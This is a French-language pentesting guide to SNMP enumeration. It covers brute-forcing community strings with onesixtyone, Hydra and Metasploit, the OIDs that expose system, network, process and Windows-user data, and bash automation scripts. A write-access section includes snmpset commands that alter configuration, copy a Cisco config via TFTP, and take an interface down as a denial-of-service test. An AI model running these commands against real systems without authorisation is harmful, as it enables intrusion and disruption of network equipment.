# SNMP Enumeration

## 📊 Vue d'ensemble

SNMP (Simple Network Management Protocol) est un protocole pour **gérer et surveiller** les équipements réseau. Souvent mal sécurisé, il peut révéler des **informations critiques** sur l'infrastructure.

> **💡 Explication Simple** : SNMP c'est comme le tableau de bord d'une voiture, mais pour les équipements réseau. Si quelqu'un peut y accéder, il voit TOUT : vitesse, consommation, alertes, historique !

**Ports SNMP :**
- **Port 161** : SNMP Agent (UDP)
- **Port 162** : SNMP Trap (UDP)

## ⚠️ **IMPORTANT - À propos des exemples**

> **🎯 TOUS les IPs, community strings, OIDs sont FICTIFS !**

**Dans le guide (EXEMPLE FICTIF) :**
```
192.168.1.100
community: public, private, manager
1.3.6.1.2.1.1.1.0
```

**Dans la vraie vie, vous devez adapter :**
```
10.0.2.15
[vraies community strings trouvées]
[OIDs spécifiques à votre cible]
```

## 🎯 Objectifs de l'Énumération SNMP

1. **Identifier les community strings** - public, private, custom
2. **Énumérer les informations système** - OS, uptime, processus
3. **Découvrir la configuration réseau** - interfaces, routes, ARP
4. **Lister les processus** - Services en cours d'exécution
5. **Extraire les utilisateurs** - Comptes système

## 🔍 Phase 1 : Découverte SNMP

### Détection SNMP
```bash
# 1. Nmap pour détecter SNMP
nmap -sU -p 161 target.com

# 2. Scan de range pour SNMP
nmap -sU -p 161 192.168.1.0/24

# 3. Scripts Nmap SNMP
nmap --script snmp-* target.com -p 161

# 4. Test manuel avec snmpwalk
snmpwalk -c public -v1 target.com
```

### Version SNMP Detection
```bash
# 1. SNMPv1 (le plus commun et faible)
snmpwalk -c public -v1 target.com 1.3.6.1.2.1.1.1.0

# 2. SNMPv2c (communauté améliorée)
snmpwalk -c public -v2c target.com 1.3.6.1.2.1.1.1.0

# 3. SNMPv3 (sécurisé avec auth)
snmpwalk -v3 -l authPriv -u username -a SHA -A password -x AES -X privpass target.com
```

## 🔑 Phase 2 : Brute Force Community Strings

### Community Strings Communes
```bash
# 1. Strings par défaut
public, private, manager, community
admin, administrator, root, guest
cisco, default, secret, password

# 2. Strings spécifiques constructeurs
# Cisco: cisco, rmon, ilmi
# HP: hp, admin
# Dell: dell, public
# 3Com: 3com, admin, monitor
```

### Outils de Brute Force

#### onesixtyone (Rapide)
```bash
# 1. Test communautés courantes
onesixtyone target.com

# 2. Avec wordlist
onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt target.com

# 3. Sur range d'IPs
onesixtyone -c community.txt 192.168.1.0/24

# 4. Verbeux
onesixtyone -c community.txt -i targets.txt -w 100
```

#### Metasploit SNMP
```bash
msfconsole
# 1. Community scanner
use auxiliary/scanner/snmp/snmp_login
set RHOSTS target.com
set PASS_FILE /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt
run

# 2. Énumération système
use auxiliary/scanner/snmp/snmp_enum
set RHOSTS target.com
set COMMUNITY public
run
```

#### Hydra pour SNMP
```bash
# 1. Brute force basic
hydra -P community.txt target.com snmp

# 2. Avec délai
hydra -P community.txt -t 1 -w 3 target.com snmp
```

## 🔍 Phase 3 : Énumération avec OIDs

### OIDs Critiques à Connaître

#### 📊 Informations Système
```bash
# System Information
1.3.6.1.2.1.1.1.0     # sysDescr - Description système
1.3.6.1.2.1.1.3.0     # sysUpTime - Uptime
1.3.6.1.2.1.1.4.0     # sysContact - Contact admin  
1.3.6.1.2.1.1.5.0     # sysName - Nom système
1.3.6.1.2.1.1.6.0     # sysLocation - Localisation

# Exemples d'utilisation :
snmpwalk -c public -v1 target.com 1.3.6.1.2.1.1.1.0
snmpget -c public -v1 target.com 1.3.6.1.2.1.1.5.0
```

#### 🌐 Informations Réseau
```bash
# Network Interfaces
1.3.6.1.2.1.2.2.1.2   # ifDescr - Description interfaces
1.3.6.1.2.1.2.2.1.7   # ifAdminStatus - Status admin
1.3.6.1.2.1.2.2.1.8   # ifOperStatus - Status opérationnel

# IP Information  
1.3.6.1.2.1.4.20.1.1  # ipAdEntAddr - Adresses IP
1.3.6.1.2.1.4.20.1.3  # ipAdEntNetMask - Masques réseau
1.3.6.1.2.1.4.21.1.1  # ipRouteDestination - Table routage

# ARP Table
1.3.6.1.2.1.4.22.1.2  # ipNetToMediaPhysAddress - Adresses MAC
1.3.6.1.2.1.4.22.1.3  # ipNetToMediaNetAddress - Adresses IP ARP
```

#### ⚙️ Processus et Services
```bash
# Processus en cours
1.3.6.1.2.1.25.1.1.0  # hrSWRunName - Noms processus
1.3.6.1.2.1.25.4.2.1.2 # hrSWRunName - Processus détaillés
1.3.6.1.2.1.25.4.2.1.4 # hrSWRunPath - Chemins exécutables

# Services installés
1.3.6.1.2.1.25.6.3.1.2 # hrSWInstalledName - Logiciels installés

# Storage info
1.3.6.1.2.1.25.2.3.1.3 # hrStorageDescr - Description stockage
1.3.6.1.2.1.25.2.3.1.6 # hrStorageUsed - Espace utilisé
```

#### 👥 Utilisateurs (Windows)
```bash
# Windows Users
1.3.6.1.4.1.77.1.2.25  # Utilisateurs Windows
1.3.6.1.4.1.77.1.2.27  # Domaines Windows

# User accounts (si accessible)
1.3.6.1.4.1.77.1.2.25.1.1 # Noms utilisateurs
```

### Commandes snmpwalk Pratiques
```bash
# 1. Dump complet (attention à la taille)
snmpwalk -c public -v1 target.com

# 2. Informations système
snmpwalk -c public -v1 target.com 1.3.6.1.2.1.1

# 3. Interfaces réseau
snmpwalk -c public -v1 target.com 1.3.6.1.2.1.2.2.1.2

# 4. Processus (si disponible)
snmpwalk -c public -v1 target.com 1.3.6.1.2.1.25.4.2.1.2

# 5. Avec output formaté
snmpwalk -c public -v1 target.com | grep -i "process\|user\|admin"
```

## 🛠️ Phase 4 : Outils Spécialisés

### snmp-check (Automatisé)
```bash
# 1. Énumération complète
snmp-check target.com

# 2. Avec community custom
snmp-check -c private target.com

# 3. Output vers fichier
snmp-check target.com > snmp_enum.txt

# 4. Port spécifique
snmp-check -p 161 target.com
```

### snmpenum (Script Perl)
```bash
# 1. Si snmpenum installé
perl snmpenum.pl target.com public windows.txt

# 2. Pour Linux/Unix
perl snmpenum.pl target.com public linux.txt
```

### Metasploit Modules SNMP
```bash
msfconsole

# 1. Énumération générale
use auxiliary/scanner/snmp/snmp_enum
set RHOSTS target.com
set COMMUNITY public
run

# 2. Énumération users Windows
use auxiliary/scanner/snmp/snmp_enumusers  
set RHOSTS target.com
set COMMUNITY public
run

# 3. Énumération shares Windows
use auxiliary/scanner/snmp/snmp_enumshares
set RHOSTS target.com
set COMMUNITY public
run
```

## 📊 Phase 5 : Analyse des Données Collectées

### Tri et Analyse
```bash
# 1. Extraire informations système
snmpwalk -c public -v1 target.com 1.3.6.1.2.1.1 | grep -E "sysDescr|sysName|sysContact"

# 2. Extraire adresses IP et interfaces
snmpwalk -c public -v1 target.com 1.3.6.1.2.1.4.20.1.1

# 3. Recherche de processus sensibles
snmpwalk -c public -v1 target.com 1.3.6.1.2.1.25.4.2.1.2 | grep -i "sql\|ftp\|apache\|admin"

# 4. Recherche users (Windows)
snmpwalk -c public -v1 target.com 1.3.6.1.4.1.77.1.2.25
```

### Scripts d'Analyse Automatisé
```bash
#!/bin/bash
# SNMP Analysis Script

TARGET=$1
COMMUNITY=${2:-public}

echo "[+] Analyzing SNMP data for $TARGET with community '$COMMUNITY'"

echo "=== SYSTEM INFO ==="
snmpget -c $COMMUNITY -v1 $TARGET 1.3.6.1.2.1.1.1.0 2>/dev/null | cut -d'"' -f2
snmpget -c $COMMUNITY -v1 $TARGET 1.3.6.1.2.1.1.5.0 2>/dev/null | cut -d'"' -f2

echo -e "\n=== NETWORK INTERFACES ==="
snmpwalk -c $COMMUNITY -v1 $TARGET 1.3.6.1.2.1.2.2.1.2 2>/dev/null | grep -v "No Such"

echo -e "\n=== IP ADDRESSES ==="
snmpwalk -c $COMMUNITY -v1 $TARGET 1.3.6.1.2.1.4.20.1.1 2>/dev/null | grep -v "No Such"

echo -e "\n=== RUNNING PROCESSES ==="
snmpwalk -c $COMMUNITY -v1 $TARGET 1.3.6.1.2.1.25.4.2.1.2 2>/dev/null | grep -v "No Such" | head -20
```

## 🔐 Phase 6 : SNMP Write Access

### Test Write Community
```bash
# 1. Test si write access (dangereux !)
snmpset -c private -v1 target.com 1.3.6.1.2.1.1.4.0 s "Test contact"

# 2. Avec différentes communities
for community in private manager admin write; do
    echo "Testing write with $community"
    snmpset -c $community -v1 target.com 1.3.6.1.2.1.1.4.0 s "test" 2>/dev/null
done

# 3. Restore original value (important !)
snmpset -c private -v1 target.com 1.3.6.1.2.1.1.4.0 s "Original Contact"
```

### Exploitation Write Access
```bash
# ⚠️ ATTENTION : Peut impacter le système !

# 1. Modification configuration (avec prudence)
snmpset -c private -v1 target.com OID_CONFIG i new_value

# 2. Cisco specific (si c'est un équipement Cisco)
# Copie de configuration via TFTP
snmpset -c private -v1 cisco_device TFTP_OID s "192.168.1.100"

# 3. Restart interface (test de DoS)
snmpset -c private -v1 target.com 1.3.6.1.2.1.2.2.1.7.1 i 2  # down
snmpset -c private -v1 target.com 1.3.6.1.2.1.2.2.1.7.1 i 1  # up
```

## 📋 Checklist SNMP Enumeration

### ✅ Tests Essentiels :
1. **Port Discovery** - 161/UDP ouvert ?
2. **Community Brute Force** - public, private, custom
3. **System Information** - OS, version, uptime
4. **Network Configuration** - Interfaces, IPs, routes
5. **Process Enumeration** - Services, applications
6. **Write Access Test** - Community avec droits write

### ✅ OIDs Prioritaires :
- **1.3.6.1.2.1.1** - Informations système
- **1.3.6.1.2.1.2.2.1.2** - Interfaces réseau
- **1.3.6.1.2.1.4.20.1.1** - Adresses IP
- **1.3.6.1.2.1.25.4.2.1.2** - Processus
- **1.3.6.1.4.1.77.1.2.25** - Utilisateurs Windows

## 🛠️ Script d'Énumération SNMP Automatisé

```bash
#!/bin/bash
# SNMP Enumeration Script

TARGET=$1
if [ -z "$TARGET" ]; then
    echo "Usage: $0 <target_ip>"
    exit 1
fi

echo "[+] Starting SNMP enumeration for $TARGET"
mkdir ${TARGET}_snmp_enum

# 1. Check if SNMP port is open
echo "[+] Checking SNMP port..."
nmap -sU -p 161 $TARGET > ${TARGET}_snmp_enum/port_scan.txt

if ! grep -q "161/udp open" ${TARGET}_snmp_enum/port_scan.txt; then
    echo "[-] SNMP port not open, exiting"
    exit 1
fi

# 2. Community string brute force
echo "[+] Brute forcing community strings..."
echo -e "public\nprivate\ncommunity\nmanager\nadmin\ndefault\ncisco\nhp" > ${TARGET}_snmp_enum/communities.txt
onesixtyone -c ${TARGET}_snmp_enum/communities.txt $TARGET > ${TARGET}_snmp_enum/communities_found.txt

# 3. For each found community, enumerate
while read line; do
    if [[ $line == *"["* ]]; then
        community=$(echo $line | cut -d'[' -f2 | cut -d']' -f1)
        echo "[+] Enumerating with community: $community"
        
        # System info
        snmpwalk -c $community -v1 $TARGET 1.3.6.1.2.1.1 > ${TARGET}_snmp_enum/system_${community}.txt 2>/dev/null
        
        # Network interfaces
        snmpwalk -c $community -v1 $TARGET 1.3.6.1.2.1.2.2.1.2 > ${TARGET}_snmp_enum/interfaces_${community}.txt 2>/dev/null
        
        # IP addresses
        snmpwalk -c $community -v1 $TARGET 1.3.6.1.2.1.4.20.1.1 > ${TARGET}_snmp_enum/ips_${community}.txt 2>/dev/null
        
        # Processes (if available)
        snmpwalk -c $community -v1 $TARGET 1.3.6.1.2.1.25.4.2.1.2 > ${TARGET}_snmp_enum/processes_${community}.txt 2>/dev/null
    fi
done < ${TARGET}_snmp_enum/communities_found.txt

# 4. Run snmp-check if available
if command -v snmp-check &> /dev/null; then
    echo "[+] Running snmp-check..."
    snmp-check $TARGET > ${TARGET}_snmp_enum/snmp_check.txt 2>/dev/null
fi

echo "[+] SNMP enumeration completed!"
echo "[+] Results saved in ${TARGET}_snmp_enum/"
```

## ⚠️ Considérations de Sécurité

### Détection et Logs
- SNMP queries peuvent être loggées
- Brute force de communities est détectable
- Write operations génèrent des alertes

### Impact Système
- SNMP write peut modifier la configuration
- Test de DoS peut impacter la production
- Always backup avant modifications

### Aspects Légaux
- SNMP enumeration peut révéler info sensibles
- Write access = modification système
- S'assurer d'avoir l'autorisation

---
*Cette section couvre l'énumération SNMP complète. Pour l'exploitation des vulnérabilités SNMP, voir la section 02-Exploitation/Réseaux/*
